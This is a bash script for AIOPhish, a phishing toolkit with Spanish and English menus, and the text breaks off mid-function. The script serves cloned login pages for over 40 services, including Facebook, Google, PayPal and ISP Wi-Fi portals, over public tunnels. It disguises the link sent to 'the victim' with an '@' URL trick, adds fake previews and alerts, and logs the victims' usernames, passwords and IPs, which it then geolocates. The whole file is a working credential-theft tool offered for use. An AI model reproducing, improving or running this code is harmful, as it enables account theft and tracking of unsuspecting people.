#Create by https://github.com/DeepSociety
#Si copias deja creditos😛

trap 'printf "\n";stop;exit 1' 2
r="\e[1;91m"
v="\e[1;92m"
a="\e[1;93m"
b="\e[1;39m"
m="\e[1;96m"
z="\e[1;94m"
rnd=`shuf -i 3000-10000 -n 1`
crnd=`shuf -i 1-9 -n 1`
DIA=`date +"%d/%m/%Y"`
HORA=`date +"%H:%M"`
link="localhost:$rnd"
brnd=`shuf -i 2-7 -n 1`
banner="a$brnd"
s="m"
bcolor="\e[1;3$crnd$s"
#Banners
dev(){
echo -e "\e[1;92m				  create by\e[1;39m > DeepSociety"
}

bye(){
printf "$r ██████████\e[1;39m██████████\e[1;31m██████████\e[1;39m\n\n"
printf "https://github.com/DeepSociety/AIOPhish"
printf "\n\n"
printf "\e[1;33m[*]\e[1;32m Phishing tool 2.5\e[1;33m [*]\n\n\e[1;33m[!]\e[1;39m"
printf " \e[1;39mNo elimines ningun archivo\e[0m\e[1;33m [!]\e[0m"
printf "\n"
echo
echo
}

a2(){

echo "        _____ _____  ______  _     _      _     ";
echo "   /\  (_____) ___ \(_____ \| |   (_)    | |    ";
echo "  /  \    _ | |   | |_____) ) | _  _  ___| | _  ";
echo " / /\ \  | || |   | |  ____/| || \| |/___) || \ ";
echo "| |__| |_| || |___| | |     | | | | |___ | | | |";
echo "|______(_____)_____/|_|     |_| |_|_(___/|_| |_|";
echo "                                                ";
					 dev
bye

}

a3(){

echo "  _______ ___ _______ _______ __    __       __    ";
echo " |   _   |   |   _   |   _   |  |--|__.-----|  |--.";
echo " |.  1   |.  |.  |   |.  1   |     |  |__ --|     |";
echo " |.  _   |.  |.  |   |.  ____|__|__|__|_____|__|__|";
echo " |:  |   |:  |:  1   |:  |                         ";
echo " |::.|:. |::.|::.. . |::.|                         ";
echo " \___|___|___|_______|___|"

						dev
bye
}

a4(){

echo ".______  .___ ._______  ._______ .___.__  .___ .________.___.__  ";
echo ":      \ : __|: .___  \ : ____  |:   |  \ : __||    ___/:   |  \ ";
echo "|   .   || : || :   |  ||    :  ||   :   || : ||___    \|   :   |";
echo "|   :   ||   ||     :  ||   |___||   .   ||   ||       /|   .   |";
echo "|___|   ||   | \_. ___/ |___|    |___|   ||   ||__:___/ |___|   |";
echo "    |___||___|   :/                  |___||___|   :         |___|";
echo "                 :                                               ";
echo "                                                                 ";
echo "                                                                 ";

					     dev
bye
}

a5(){
echo "   _____  .___________ __________.__    .__       .__     "
echo "  /  _  \ |   \_____  \\______   \  |__ |__| _____|  |__  "
echo " /  /_\  \|   |/   |   \|     ___/  |  \|  |/  ___/  |  \ "
echo '/    |    \   /    |    \    |   |   Y  \  |\___ \|   Y  \'
echo "\____|__  /___\_______  /____|   |___|  /__/____  >___|  /"
echo "        \/            \/              \/        \/     \/ "
dev
bye
}

a6(){
echo "  ____  ____  ___   ____  __ __  ____  _____ __ __ ";
echo " /    Tl    j/   \ |    \|  T  Tl    j/ ___/|  T  T";
echo "Y  o  | |  TY     Y|  o  )  l  | |  T(   \_ |  l  |";
echo "|     | |  ||  O  ||   _/|  _  | |  | \__  T|  _  |";
echo "|  _  | |  ||     ||  |  |  |  | |  | /  \ ||  |  |";
echo "|  |  | j  ll     !|  |  |  |  | j  l \    ||  |  |";
echo "l__j__j|____j\___/ l__j  l__j__j|____j \___jl__j__j";
echo "                                                   ";

dev
bye
}

a7(){

echo "  ___  _____ ___________ _     _     _     ";
echo " / _ \|_   _|  _  | ___ \ |   (_)   | |    ";
echo "/ /_\ \ | | | | | | |_/ / |__  _ ___| |__  ";
echo "|  _  | | | | | | |  __/| '_ \| / __| '_ \ ";
echo "| | | |_| |_\ \_/ / |   | | | | \__ \ | | |";
echo "\_| |_/\___/ \___/\_|   |_| |_|_|___/_| |_|";
echo "                                           ";
echo "                                           ";


dev
bye
}

#MENU

packages() {
command -v php > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing PHP..."; pkg install php -y;}
command -v curl > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing curl..."; pkg install curl -y;}
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing git..."; pkg install git -y;}
}

stop() {
checkng=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkng == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}

menu_help(){
echo -e "
$a[*]$v~~~~~~~~~~~~~~~~~~~~~~\e[1;39mAyuda\e[1;32m~~~~~~~~~~~~~~~~~~~~~$a[*]

$v Para el primer menú:

$b Selecciona un sitio web, para proceder con el phishing.

$a Ejemplo:

$b Eligo la opción 6, facebook

$v Para el segundo menú:

$b Selecciona el idioma de la pagina (español/ingles) solo en algunas paginas se puede elegir el idioma.

$v Para el tercer menú:

$b Selecciona el tunnel (serveo/ngrok) ngrok necesita una instalación, serveo es de uso mas sencillo.

$v Para el cuarto menú:

$a show title:$b mostrara un titulo al enviar el link a la victima.

$v Ejemplo:
$b Facebook Iniciar Sesión

$a show image:$b mostrara una imagen al enviar el link a la victima.

$v Ejemplo:
$b /sdcard/Download/image.png

$a show description:$b mostrara una pequeña descripcion al enviar el link a la victima

$v Ejemplo:
$b Mira este video es tuyo!!

$a show url:$b mostrara un url al enviar el link a la victima. default tu sessión de ngrok.

$v Ejemplo:
$b facebook.com

$a show alert box$b  mostrara un mensaje de alerta al entrar
al link.

$v Ejemplo:
$b Primero debes iniciar sesión

$a redirect:$b redirecciona a una url que especifiques($b Default, la red social elegida$a)

$v Ejemplo:
$b https://m.facebook.com/MarieCherryPop/photos/a.721462411210353/2510309378992305/?type=3

$b Escogeras una opción con el numero indicado. Puedes añadir todas las opciones y/o no añadir ninguna.

$b Escribe run o start para iniciar con ajustes añadidos o sin ajustes añadidos.


$a[*]$v~~~~~~~~~~~~~~~~~~~~~~\e[1;39mHelp\e[1;32m~~~~~~~~~~~~~~~~~~~~~$a[*]
$v For the first menu:

$b Select a website to proceed with phishing.

$a Example:

$b I choose option 6, facebook

$v For the second menu:

$b Select the language of the page (Spanish / English) only in some pages you can choose the language. 

$v For the third menu:

$b Select the tunnel (serveo / ngrok) ngrok needs an installation, serveo is easier to use. 

$v For the fourth menu:

$a show title: $b will show a title when sending the link to the victim. 
$v Example:
$b Facebook Login

$a show image: $b will display an image by sending the link to the victim. 
$v Example:
$b /sdcard/Download/image.png

$a show description: $b will show a short description when sending the link to the victim
$v Example:
$b Watch this video is yours !!

$a show url: $b will show a url when sending the link to the victim. default your ngro
k session.

$v Example:
$b facebook.com

$a show alert box $b will show an alert message when entering to the link. 
$v Example:
$b You must first login

$a redirect: $b redirects to a url you specify $a($b Default, the chosen social network $a)
$v Example:

$b https://m.facebook.com/MarieCherryPop/photos/a.721462411210353/2510309378992305/?type=3

$b You will choose an option with the indicated number. You can add all the options and / or not add any.

$b Type run or start to start with added settings or without added settings.

"
read -p $'\e[1;33mPRESIONA ENTER PARA CONTINUAR...' ps
if [[ $ps != "₩" ]];then
options
else
options
fi
}


menu(){
packages
echo -e $bcolor
$banner
echo
echo -e "$a[$b 1$v ]$b Amazon             $a[$b 21$v ]$b PlayStation    $a[$b 41$v ]$b Fortnite"
echo -e "$a[$b 2$v ]$b Apple              $a[$b 22$v ]$b PrimeVideo     $a[$b 42$v ]$b FreeFire"
echo -e "$a[$b 3$v ]$b Badoo              $a[$b 23$v ]$b Protonmail     $a[$b 43$v ]$b ClashOfClans"
echo -e "$a[$b 4$v ]$b Deviantart         $a[$b 24$v ]$b Reddit         $a[$b 99$v ]$b Ayuda"
echo -e "$a[$b 5$v ]$b eBay               $a[$b 25$v ]$b Shopify        $a[$b 00$v ]$b Salir"
echo -e "$a[$b 6$v ]$b Facebook           $a[$b 26$v ]$b Snapchat"
echo -e "$a[$b 7$v ]$b Foursquare         $a[$b 27$v ]$b Spotify"
echo -e "$a[$b 8$v ]$b Github             $a[$b 28$v ]$b Steam"
echo -e "$a[$b 9$v ]$b Google             $a[$b 29$v ]$b Twitch"
echo -e "$a[$b 10$v ]$b iCloud            $a[$b 30$v ]$b Twitter"
echo -e "$a[$b 11$v ]$b Imgur             $a[$b 31$v ]$b Verizon"
echo -e "$a[$b 12$v ]$b InstaFollowers    $a[$b 32$v ]$b Vimeo"
echo -e "$a[$b 13$v ]$b Instagram         $a[$b 33$v ]$b VK"
echo -e "$a[$b 14$v ]$b Linkedin          $a[$b 34$v ]$b Wifi"
echo -e "$a[$b 15$v ]$b Microsoft         $a[$b 35$v ]$b WordPress"
echo -e "$a[$b 16$v ]$b MySpace           $a[$b 36$v ]$b Yahoo"
echo -e "$a[$b 17$v ]$b Netflix           $a[$b 37$v ]$b Yandex"
echo -e "$a[$b 18$v ]$b Origin            $a[$b 38$v ]$b Yelp"
echo -e "$a[$b 19$v ]$b Paypal            $a[$b 39$v ]$b Adobe"
echo -e "$a[$b 20$v ]$b Pinterest         $a[$b 40$v ]$b Pornhub"
}
finish() {
        echo -e "$v[$b*$v]$b AIOPhish by DeepSociety"
	echo -e "$v[$b*$v]$b https://github.com/DeepSociety"
	if [[ -f ngrok ]];then
	if [[ -d $ruta_carpeta/images ]];then
        rm -rf $ruta_carpeta/images
        fi
        if [[ -f $ruta_carpeta/alert.js ]];then
        rm -rf $ruta_carpeta/alert.js
        fi
        if [[ -f $ruta_carpeta/email ]];then
        rm $ruta_carpeta/email
        fi
	if [[ -f $ruta_carpeta/pr1 ]];then
	rm $ruta_carpeta/pr1
	fi
	if [[ -f $ruta_carpeta/pr2 ]];then
        rm $ruta_carpeta/pr2
        fi
	if [[ -f $ruta_carpeta/pr3 ]];then
        rm $ruta_carpeta/pr3
        fi
	if [[ -f $ruta_carpeta/pr4 ]];then
        rm $ruta_carpeta/pr4
        fi
        if [[ -f $ruta_carpeta/hola ]];then
        rm $ruta_carpeta/hola
        fi
        if [[ -f $ruta_carpeta/victima ]];then
        rm $ruta_carpeta/victima
        fi
	sed -i "/<meta property='og:.*' content='.*'/d" ./$ruta_carpeta/index.html
        sed -i "/<script src='alert.js'/d" ./$ruta_carpeta/index.html
	else
	if [[ -d images ]];then
        rm -rf images
        fi
        if [[ -f alert.js ]];then
        rm -rf alert.js
        fi
        if [[ -f email ]];then
        rm email
        fi
        if [[ -f hola ]];then
        rm hola
        fi
	if [[ -f pr1 ]];then
	rm pr1
	fi
	if [[ -f pr2 ]];then
        rm pr2
        fi
	if [[ -f pr3 ]];then
        rm pr3
        fi
	if [[ -f pr4 ]];then
        rm pr4
        fi
        if [[ -f victima ]];then
        rm victima
        fi
        sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
        sed -i "/<script src='alert.js'/d" ./index.html
	fi
}

options(){
menu
echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;92m Elige una opción\e[1;39m > ' opc
echo
if [[ $opc == "1" || $opc == "01" ]];then
web="amazon"
go

elif [[ $opc == "2" || $opc == "02" ]];then
web="apple"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "3" || $opc == "03" ]];then
web="badoo"
go

elif [[ $opc == "4" || $opc == "04" ]];then
web="devianart"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "5" || $opc == "05" ]];then
web="ebay"
go

elif [[ $opc == "6" || $opc == "06" ]];then
list_fb

elif [[ $opc == "7" || $opc == "07" ]];then
web="foursquare"
go

elif [[ $opc == "8" || $opc == "08" ]];then
web="github"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "9" || $opc == "09" ]];then
list_goo

elif [[ $opc == "10" ]];then
web="icloud"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "11" ]];then
web="imgur"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "12" ]];then
web="instafollowers"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "13" ]];then
list_insta

elif [[ $opc == "14" ]];then
web="linkedin"
go

elif [[ $opc == "15" ]];then
web="microsoft"
go

elif [[ $opc == "16" ]];then
web="myspace"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "17" ]];then
web="netflix"
go

elif [[ $opc == "18" ]];then
web="origin"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "19" ]];then
web="paypal"
go

elif [[ $opc == "20" ]];then
web="pinterest"
go

elif [[ $opc == "21" ]];then
web="playstation"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "22" ]];then
web="primevideo"
go

elif [[ $opc == "23" ]];then
web="proton"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "24" ]];then
web="reddit"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "25" ]];then
web="shopify"
go

elif [[ $opc == "26" ]];then
web="snapchat"
go

elif [[ $opc == "27" ]];then
web="spotify"
go

elif [[ $opc == "28" ]];then
web="steam"
go

elif [[ $opc == "29" ]];then
web="twitch"
go

elif [[ $opc == "30" ]];then
web="twitter"
go

elif [[ $opc == "31" ]];then
web="verizon"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "32" ]];then
web="vimeo"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "33" ]];then
web="vk"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "34" ]];then
op="español"
list_wifi

elif [[ $opc == "35" ]];then
web="wordpress"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "36" ]];then
web="yahoo"
go

elif [[ $opc == "37" ]];then
web="yandex"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "38" ]];then
web="yelp"
go

elif [[ $opc == "39" ]];then
web="adobe"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "40" ]];then
web="pornhub"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "41" ]];then
web="pavosgratis"
op="español"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "42" ]];then
web="diamantesgratis"
op="español"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "43" ]];then
web="generadorderecursos"
op="español"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "99" ]];then
menu_help

elif [[ $opc == "00" ]];then
sleep 0.5
exit

else
echo -e "$r [!]$b Opción invalida, $opc"
sleep 0.5
options
fi
}

findngrok(){
if [[ -f ngrok ]];then
jajaj="g"
else
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando git..."; pkg install git -y;}
ar=$(uname -a | grep -o 'arm' | head -n1)
ar2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
echo -e "$v[*]$b Instalando ngrok..."
git clone https://github.com/HarrisSec/best-ngrok
cd best-ngrok
mv ngrok $OLDPWD
cd $OLDPWD
if [[ -d best-ngrok ]];then
rm -rf best-ngrok
else
echo -e "$r[!]$b Comprueba tu conexión."
exit 1
fi

else
echo -e "$v[*]$b Instalando ngrok..."
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
echo -e "$r[!]$b Comprueba tu conexión."
exit 1
fi

fi

fi

}

tunnel(){
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v] Pagina:$b $web"
echo -e "$v[$b*$v] Idioma:$b $op"
echo -e "$v[$b*$v]$b Selecciona el tunnel:\n"
echo -e "$a[$b 1$v ] Localhost.run"
echo -e "$a[$b 2$v ] Serveo"
echo -e "$a[$b 3$v ] Ngrok\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' tunnel
if [[ $tunnel == "1" || $tunnel == "01" ]];then
cd $ruta_carpeta
tunnel2="localrun"
trap finish EXIT
clear_meta
menu_options
add_option

elif [[ $tunnel == "2" || $tunnel == "02" ]];then
cd $ruta_carpeta
tunnel2="serveo"
trap finish EXIT
clear_meta
menu_options
add_option

elif [[ $tunnel == "3" || $tunnel == "03" ]];then
cd $ruta_carpeta
tunnel2="ngrok"
trap finish EXIT
clear_meta
menu_options
add_option
else
echo
echo -e "\e[1;91m[*]\e[1;39m Opción invalida: $tunnel"
echo
sleep 0.5
tunnel
fi
}

list_fb(){
clear
echo -e $bcolor
$banner
echo -e "
$v[$b*$v] Pagina:$b Facebook\n
$a[$b 1 $v] Pagina oficial
$a[$b 2$v ] Facebook mensaje
$a[$b 3$v ] Facebook Seguridad
$a[$b 4$v ] Facebook Messenger
$a[$b 99$v ] Elegir otra pagina\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcfb
if [[ $opcfb == "1" || $opcfb == "01" ]];then
web="facebook"
go
elif [[ $opcfb == "2" || $opcfb == "02" ]];then
web="mobile.facebook"
go
elif [[ $opcfb == "3" || $opcfb == "03" ]];then
web="alertadeseguridad"
go
elif [[ $opcfb == "4" || $opcfb == "04" ]];then
web="messenger"
go
elif [[ $opcfb == "99" ]];then
options
else
echo -e "\n$r[!]$b Opción invalida\n"
sleep 1
list_fb
fi
}

list_insta(){
clear
echo -e $bcolor
$banner
echo -e "
$v[$b*$v] Pagina:$b Instagram\n
$a[$b 1$v ] Pagina oficial
$a[$b 2$v ] Instagram likes
$a[$b 3$v ] Instagram avanzado
$a[$b 99$v ] Elegir otra pagina\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcin
if [[ $opcin == "1" || $opcin == "01" ]];then
web="instagram"
go
elif [[ $opcin == "2" || $opcin == "02" ]];then
web="autoinsta"
op="ingles"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcin == "3" || $opcin == "03" ]];then
web="mobile.instagram"
adv_insta
elif [[ $opcin == "99" ]];then
options
else
echo -e "\n$r[!]$b Opción invalida\n"
sleep 1
list_insta
fi
}

adv_insta(){
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v]$b Selecciona las fotos que se mostraran:\n
$a[$b 1$v ] MiaKhalifa
$a[$b 2$v ] Justin Biber\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' sex
if [[ $sex == "1" || $sex == "01" ]];then
adv="xd"
sexo="miak"
go
elif [[ $sex == "2" || $sex == "02" ]];then
adv="xd"
sexo="man"
go
else
echo -e "$r[!]$b Opción invalida"
sleep 1
adv_insta
fi
}

list_goo(){
clear
echo -e $bcolor
$banner
echo -e "
$v[$b*$v] Pagina:$b Google\n
$a[$b 1$v ] Pagina 1
$a[$b 2$v ] Pagina 2
$a[$b 3$v ] Pagina avanzada
$a[$b 99$v ] Elegir otra pagina\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcgo
if [[ $opcgo == "1" || $opcgo == "01" ]];then
web="google"
go
elif [[ $opcgo == "2" || $opcgo == "02" ]];then
web="mobile.google"
go
elif [[ $opcgo == "3" || $opcgo == "03" ]];then
web="sign.google"
go
elif [[ $opcgo == "99" ]];then
options
else
echo -e "\n$r[!]$b Opción invalida\n"
sleep 1
list_goo
fi
}

list_wifi(){
clear
echo -e $bcolor
$banner
echo -e "
$v[$b*$v] Pagina:$b Wifi\n
$a[$b 1$v ] Claro wifi
$a[$b 2$v ] Directv wifi
$a[$b 3$v ] GoogleWlan
$a[$b 4$v ] Movistar
$a[$b 5$v ] Telekom
$a[$b 6$v ] Telmex
$a[$b 7$v ] Tigo
$a[$b 8$v ] Tp-link
$a[$b 9$v ] HuaweiCnt
$a[$b 99$v ] Elegir otra pagina\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcwi
if [[ $opcwi == "1" || $opcwi == "01" ]];then
web="claro"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "2" || $opcwi == "02" ]];then
web="directv"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "3" || $opcwi == "03" ]];then
web="googlewlan"
ruta_carpeta="websites/$web"
echo
op="ingles"
tunnel
elif [[ $opcwi == "4" || $opcwi == "04" ]];then
web="movistar"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "5" || $opcwi == "05" ]];then
web="telekom"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "6" || $opcwi == "06" ]];then
web="telmex"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "7" || $opcwi == "07" ]];then
web="tigo"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "8" || $opcwi == "08" ]];then
web="tplink"
op="ingles"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "9" || $opcwi == "09" ]];then
web="huawei"
ruta_carpeta="websites/$web"
echo
tunnel
elif [[ $opcwi == "99" ]];then
options
else
echo -e "\n$r[!]$b Opción invalida\n"
sleep 1
list_wifi
fi
}

go(){
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v] Pagina:$b $web"
echo -e "$v[$b*$v]$b Selecciona el idioma de la pagina:\n"
echo -e "$a[$b 1$v ]$v Español"
echo -e "$a[$b 2$v ]$v English"
echo -e "$a[$b 99$v ]$v Elegir otra pagina\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' lg
echo
if [[ $lg == "1" || $lg == "01" ]];then
op="español"
idioma="es"
if [[ $adv == "xd" ]];then
ruta_carpeta="websites/$web/es/$sexo"
else
ruta_carpeta="websites/$web/es"
fi
echo
tunnel
elif [[ $lg == "2" || $lg == "02" ]];then
op="english"
idioma="us"
if [[ $adv == "xd" ]];then
ruta_carpeta="websites/$web/us/$sexo"
else
ruta_carpeta="websites/$web/us"
fi
echo
tunnel
elif [[ $lg == "99" ]];then
options
else
echo -e "$r[*]$b Opción invalida: $lg"
sleep 0.5
go
fi
}


##server
localrun(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
echo
port=3333
echo
php -S localhost:$port > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2
if [[ -f run ]];then
rm run
fi
$(which sh) -c 'ssh -R 80:localhost:$port ssh.localhost.run 2> /dev/null > run ' &
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 5
echo -e "$v[$b*$v]$b Abriendo local.run..."
sleep 5
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 5
envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b localhost:3333"
echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
cutt
check
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check_found
fi
if [[ -f run ]]; then
rm run
fi
}


serveo(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
echo
port=3333
echo
php -S localhost:$port > /dev/null 2>&1 & 
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2
if [[ -f link ]]; then
rm -rf link
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 5
echo -e "$v[$b*$v]$b Abriendo serveo..."
sleep 5
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 5
envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b localhost:3333"
echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
cutt
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check
check_found
fi
if [[ -f link ]]; then
rm -rf link
fi
}

ngrok(){
echo
php -S $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2
cd $OLDPWD
findngrok
./ngrok http $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
sleep 5
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 7
echo -e "$v[$b*$v]$b Abriendo ngrok..."
sleep 7
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 7
envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b $link"
echo -e "$v[$b*$v]$b Envia a la victima > \e[0;32m$envialink"
cd $ruta_carpeta
cutt
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check
check_found
fi
}

cutt(){
namee=$(echo "$envialink" | cut -d "/" -f3)
pop9="https://www.$web.com@$namee"
echo -e "$v[$b*$v]$b Envio por facebook\e[0;32m " $pop9
}


check_found(){
echo -e "\n$r[$b*$r]$b Esperando Datos$r [$b*$r]"
echo -e $v
while true;do
if [[ -f foundip.txt ]];then
sed -i '3iIP Encontrada: '"$HORA"' '"$DIA"'' foundip.txt
echo
echo -e "$v[*]$a IP Encontrada!!"
found_ip
rm foundip.txt
sleep 0.5
fi

if [[ -f founduser.txt ]];then
sed -i '3iDatos Encontrados: '"$HORA"' '"$DIA"'' founduser.txt
echo -e "$v[*]$a Datos Encontrados!!"
found_user
rm founduser.txt
fi
sleep 0.5
done

}

found_ip(){
ip=$(grep -a 'IP:' foundip.txt | cut -d " " -f2 | tr -d '\r')
agent=$(grep 'User-Agent:.*' foundip.txt | cut -d ':' -f2)
saved_to="\e[1;33mIP Guardada:$b $ruta_carpeta/ip.txt"
echo -e "$a[*]$v IP:$b " $ip
echo
echo -e  "$a[*]$v User-Agent:$b"$agent
echo
echo -e $saved_to
cat foundip.txt >> ip.txt
echo
dates_ip
echo
echo -e "$v[$b*$v]$b Esperando proximos datos$v [$b*$v]"
echo
}

found_user(){
account=$(grep -o 'Username:.*' founduser.txt | cut -d " " -f2)
password=$(grep -o 'Password:.*' founduser.txt | cut -d ":" -f2)
saved_to="\e[1;33mDatos Guardados:$b $ruta_carpeta/account.txt"
echo -e "$a[*]$v Usuario:$b" $account
echo -e "$a[*]$v Contraseña:$b" $password
echo
echo -e $saved_to
cat founduser.txt >> account.txt
echo
echo -e "$v[$b*$v]$b Esperando proximos datos$v [$b*$v]"
echo
}


dates_ip(){
if [[ -f infoip ]];then
rm infoip
fi

ipfind=$(curl -s -L "http://ip-api.com/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > infoip)
query=$(grep -o '"query":.*' infoip | cut -d '"' -f4)

if [[ $query == "" ]]; then
echo -e "$v[*] Hostname:$b Unknown"
else
echo -e "$v[*] Hostname:$b" $query
fi

country=$(grep -o '"country":.*' infoip | cut -d '"' -f4)

if [[ $country == "" ]]; then

echo -e "$v[*] Country:$b Unknown"
else
echo -e "$v[*] Country:$b" $country
fi

cc=$(grep -o '"countryCode":.*' infoip | cut -d '"' -f4)

if [[ $cc == "" ]];then
echo -e "$v[*] Country Code:$b Unknown"
else
echo -e "$v[*] Country Code:$b" $cc
fi


rn=$(grep -o '"regionName":.*' infoip | cut -d '"' -f4)
if [[ $rn == "" ]];then
echo -e "$v[*] Region:$b Unknown"

else
echo -e "$v[*] Region:$b" $rn
fi

city=$(grep -o '"city":.*' infoip | cut -d '"' -f4)
if [[ $city == "" ]];then
echo -e "$v[*] City:b Unknown"
else
echo -e "$v[*] City:$b" $city
fi

zip=$(grep -o '"zip":.*' infoip | cut -d '"' -f4)
if [[ $zip == "" ]];then
echo -e "$v[*] zip:$b Unknown"
else
echo -e "$v[*] zip:$b" $zip
fi

tz=$(grep -o '"timezone":.*' infoip | cut -d '"' -f4)
if [[ $tz == "" ]];then
echo -e "$v[*] Time Zone:$b Unknown"
else
echo -e "$v[*] Time Zone:$b" $tz
fi

isp=$(grep -o '"isp".*' infoip | cut -d '"' -f4)
if [[ $isp == "" ]];then

echo -e "$v[*] ISP:$b Unknown"
else
echo -e "$v[*] ISP:$b" $isp
fi

org=$(grep -o '"org":.*' infoip | cut -d '"' -f4)
if [[ $org == "" ]];then
echo -e "$v[*] org:$b Unknown"
else
echo -e "$v[*] org:$b" $org
fi

as=$(grep -o '"as":.*' infoip | cut -d '"' -f4)
if [[ $as == "" ]];then
echo -e "$v[*] AS:$b Unknown"
else
echo -e "$v[*] AS:$b" $as
fi

lan=$(grep -o '"lat":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
lon=$(grep -o '"lon":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)

if [[ $lan == "" || $lon == "" ]];then
echo -e "$v[*] Google Maps:$b Unknown"
else
link_maps="https://www.google.com/maps/place/$lan,$lon"
echo -e "$v[*] Google Maps:$b" $link_maps

rm infoip
fi
}

#MAS OPCIONES

clear_meta(){
if [[ -f link ]];then
rm link
fi

if [[ -d images ]];then
